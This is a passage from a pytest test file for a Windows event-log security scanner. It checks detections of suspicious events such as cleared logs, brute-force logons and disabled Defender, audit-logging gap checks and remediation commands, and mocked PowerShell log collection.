    assert drops[r"C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk"] == Severity.MEDIUM
    assert len(drops) == 2
    assert el.detect_sysmon([], None) == []


# ---------------------------------------------------------------- orchestration
def test_analyse_all_groups_by_log_key():
    logs = {"security": [E(1102, "Security", 0, SubjectUserName="bob")] + fails(20) + [logon(500)],
            "system": [E(7045, "System", 0, ServiceName="s", ImagePath=r"C:\Users\Public\s.exe")],
            "defender": [E(5001, "Defender", 0)], "powershell": [], "wmi": [], "sysmon": []}
    got = set(ids(el.analyse_all(logs, None, [])))
    assert {"AEG-EVT-CLEARED", "AEG-EVT-BRUTE-SUCCESS", "AEG-EVT-SVCINSTALL", "AEG-EVT-DEF-OFF"} <= got
    assert el.analyse_all({}, None, []) == []


# ---------------------------------------------------------------- audit gaps
class RegStub:
    def __init__(self, values):
        self.values = {(h.upper(), k.lower(), v.lower()): d for (h, k, v), d in values.items()}

    def __call__(self, hive, key, value, view64=True):
        return self.values.get((hive.upper(), key.lower(), value.lower()))


def test_visibility_all_off(monkeypatch):
    monkeypatch.setattr(el, "reg_read", RegStub({}))
    checks, findings = el.visibility_checks(False, True, None)
    st = {c.check_id: c.status for c in checks}
    assert st["AEG-EVT-AUDIT-PROC"] == CheckStatus.WARN and st["AEG-EVT-AUDIT-CMDLINE"] == CheckStatus.WARN
    assert st["AEG-EVT-AUDIT-PSLOG"] == CheckStatus.WARN and st["AEG-EVT-AUDIT-MODLOG"] == CheckStatus.WARN
    assert {f.rule_id for f in findings} == {"AEG-EVT-AUDIT-PROC", "AEG-EVT-AUDIT-CMDLINE", "AEG-EVT-AUDIT-PSLOG"}
    assert all(f.severity == Severity.INFO for f in findings)
    rem = {f.rule_id: f.remediation for f in findings}
    assert rem["AEG-EVT-AUDIT-PROC"].action == "run_command"
    assert rem["AEG-EVT-AUDIT-PROC"].params["command"][-1] == "/success:enable"
    assert "0CCE922B-69AE-11D9-BED3-505054503030" in rem["AEG-EVT-AUDIT-PROC"].params["command"][2]
    assert rem["AEG-EVT-AUDIT-CMDLINE"].action == "set_registry_value" and rem["AEG-EVT-AUDIT-CMDLINE"].params["data"] == 1
    assert rem["AEG-EVT-AUDIT-PSLOG"].params["value"] == "EnableScriptBlockLogging"


def test_visibility_all_on_and_unreadable(monkeypatch):
    monkeypatch.setattr(el, "reg_read", RegStub({
        ("HKLM", el._AUDIT_KEY, "ProcessCreationIncludeCmdLine_Enabled"): 1,
        ("HKLM", el._SBL_KEY, "EnableScriptBlockLogging"): 1,
        ("HKLM", el._MODLOG_KEY, "EnableModuleLogging"): 1}))
    checks, findings = el.visibility_checks(True, True, None)
    assert findings == [] and {c.status for c in checks} == {CheckStatus.PASS}
    checks, findings = el.visibility_checks(None, False, None)
    assert [c for c in checks if c.check_id == "AEG-EVT-AUDIT-PROC"][0].status == CheckStatus.SKIP


def test_visibility_security_log_history(monkeypatch):
    monkeypatch.setattr(el, "reg_read", RegStub({}))
    now = T0 + 86400 * 20
    full_small = {"Oldest": el.fmt_time(T0 + 86400 * 18), "MaxBytes": 20971520, "FileBytes": 20971520}
    checks, findings = el.visibility_checks(True, True, full_small, now=now)
    c = [x for x in checks if x.check_id == "AEG-EVT-LOGSIZE"][0]
    f = [x for x in findings if x.rule_id == "AEG-EVT-LOGSIZE"][0]
    assert c.status == CheckStatus.WARN and f.severity == Severity.INFO
    assert f.remediation.params["command"][:3] == ["wevtutil", "sl", "Security"]
    roomy = {"Oldest": el.fmt_time(T0 - 86400 * 30), "MaxBytes": 20971520, "FileBytes": 1000}
    checks, findings = el.visibility_checks(True, True, roomy, now=now)
    assert [x for x in checks if x.check_id == "AEG-EVT-LOGSIZE"][0].status == CheckStatus.PASS


# ---------------------------------------------------------------- collection + scanner (PowerShell mocked)
def test_classify_errors():
    assert el.classify_errors([]) == ""
    assert el.classify_errors(["NoMatchingEventsFound,Microsoft.PowerShell.Commands.GetWinEventCommand|Exception"]) == ""
    assert el.classify_errors(["x|UnauthorizedAccessException"]) == "no_access"
    assert el.classify_errors(["NoMatchingLogsFound,Microsoft.PowerShell.Commands.GetWinEventCommand|Exception"]) == "missing"
    assert el.classify_errors(["list|EventLogNotFoundException"]) == "missing"
    assert el.classify_errors(["weird|Boom"]) == "error"


def fake_ps(by_log):
    """powershell_json stub: pick the canned reply by the log name quoted in the script."""
    def run(script, timeout=90):
        for name, reply in by_log.items():
            if f"-ListLog '{name}'" in script:
                return reply
        return None
    return run


def test_collect_log_normalises_and_classifies(monkeypatch):
    spec = el.LOG_SPECS[0]
    reply = {"Events": [{"I": 4720, "X": XML_4720}, {"I": 1102, "X": XML_1102}], "Errors": [],
             "Info": {"Oldest": "2026-10-01T00:00:00Z"}, "Av": []}
    monkeypatch.setattr(el, "powershell_json", fake_ps({"Security": reply}))
    ld = el.collect_log(spec)
    assert ld.ok and [e["id"] for e in ld.events] == [4720, 1102] and all(e["log"] == "Security" for e in ld.events)
    assert ld.info["Oldest"].startswith("2026")

    monkeypatch.setattr(el, "powershell_json", fake_ps({"Security": {"Events": [], "Errors": ["x|UnauthorizedAccessException"]}}))
    assert el.collect_log(spec).problem == "no_access"
    monkeypatch.setattr(el, "powershell_json", fake_ps({"Security": {"Events": {"I": 4720, "X": XML_4720}, "Errors": []}}))
    assert len(el.collect_log(spec).events) == 1  # PowerShell collapses one-element arrays: still handled
    monkeypatch.setattr(el, "powershell_json", lambda *a, **k: None)
    assert el.collect_log(spec).problem == "error"
    sysmon = el.LOG_SPECS[-1]
    monkeypatch.setattr(el, "powershell_json", fake_ps({sysmon.name: {"Events": [], "Errors": ["list|EventLogNotFoundException"],
                                                                         "Info": {"Enabled": None}}}))
    assert el.collect_log(sysmon).problem == "missing"


def make_ctx(ctx, admin=True):
    ctx.is_admin = admin
    return ctx


def test_scanner_end_to_end_with_mocks(monkeypatch, ctx):
    sec = {"Events": [{"I": 4720, "X": XML_4720}, {"I": 1102, "X": XML_1102}], "Errors": [],
           "Info": {"Oldest": "2026-10-01T00:00:00Z", "MaxBytes": 100, "FileBytes": 1}, "Av": []}
    replies = {"Security": sec, "System": {"Events": [], "Errors": [], "Info": {}, "Av": []},
               el.LOG_SPECS[2].name: {"Events": [], "Errors": [], "Info": {}, "Av": []},
               el.LOG_SPECS[3].name: {"Events": [], "Errors": ["x|UnauthorizedAccessException"], "Info": {}},
               el.LOG_SPECS[4].name: {"Events": [], "Errors": [], "Info": {}, "Av": []},
               el.LOG_SPECS[5].name: {"Events": [], "Errors": ["list|EventLogNotFoundException"], "Info": {}}}
    monkeypatch.setattr(el, "IS_WINDOWS", True)
    monkeypatch.setattr(el, "powershell_json", fake_ps(replies))
    monkeypatch.setattr(el, "reg_read", RegStub({}))
    out = list(el.EventLogScanner().run(make_ctx(ctx)))
    findings = [x for x in out if isinstance(x, Finding)]
    checks = {c.check_id: c for c in out if isinstance(c, CheckResult)}
    assert {"AEG-EVT-CLEARED", "AEG-EVT-NEWUSER"} <= set(ids(findings))
    assert {"AEG-EVT-AUDIT-PROC", "AEG-EVT-AUDIT-CMDLINE", "AEG-EVT-AUDIT-PSLOG"} <= set(ids(findings))
    assert checks["AEG-EVT-LOG-SECURITY"].status == CheckStatus.PASS
    assert checks["AEG-EVT-LOG-POWERSHELL"].status == CheckStatus.SKIP
    assert checks["AEG-EVT-LOG-SYSMON"].status == CheckStatus.SKIP and "Sysmon is not installed" in checks["AEG-EVT-LOG-SYSMON"].detail
    assert checks["AEG-EVT-SYSMON"].status == CheckStatus.SKIP
    assert ctx.stats["eventlog_events"] == 2
    json.dumps([x.to_dict() for x in out])


def test_scanner_non_admin_skips_security_and_non_windows_skips(monkeypatch, ctx):
    monkeypatch.setattr(el, "IS_WINDOWS", True)
    monkeypatch.setattr(el, "powershell_json", lambda *a, **k: {"Events": [], "Errors": [], "Info": {}, "Av": []})
    monkeypatch.setattr(el, "reg_read", RegStub({}))
    out = list(el.EventLogScanner().run(make_ctx(ctx, admin=False)))
    checks = {c.check_id: c for c in out if isinstance(c, CheckResult)}
    assert checks["AEG-EVT-LOG-SECURITY"].status == CheckStatus.SKIP and "Administrator" in checks["AEG-EVT-LOG-SECURITY"].detail
    assert checks["AEG-EVT-AUDIT-PROC"].status == CheckStatus.SKIP

    monkeypatch.setattr(el, "IS_WINDOWS", False)
    out = list(el.EventLogScanner().run(ctx))
    assert len(out) == 1 and out[0].status == CheckStatus.SKIP


def test_scanner_is_registered_windows_only():
    from aegis.scanners.base import REGISTRY, load_all

    load_all()
    cls = REGISTRY["eventlog"]
    assert cls.platforms == ("windows",) and cls.title and cls.description


def test_scanner_time_budget_skips_remaining_logs(monkeypatch, ctx):
    calls = []

    def ps(script, timeout=90):
        calls.append(script)
        return {"Events": [], "Errors": [], "Info": {}, "Av": []}

    monkeypatch.setattr(el, "IS_WINDOWS", True)
    monkeypatch.setattr(el, "powershell_json", ps)
    monkeypatch.setattr(el, "reg_read", RegStub({}))
    ctx.is_admin = True
    ctx.options["eventlog_budget_s"] = 1e-9
    out = list(el.EventLogScanner().run(ctx))
    assert calls == []  # budget exhausted before the first query: nothing hangs, every log is reported as unreadable
    checks = {c.check_id: c for c in out if isinstance(c, CheckResult)}
    assert checks["AEG-EVT-LOG-SECURITY"].status == CheckStatus.ERROR and checks["AEG-EVT-LOG-SYSTEM"].status == CheckStatus.ERROR
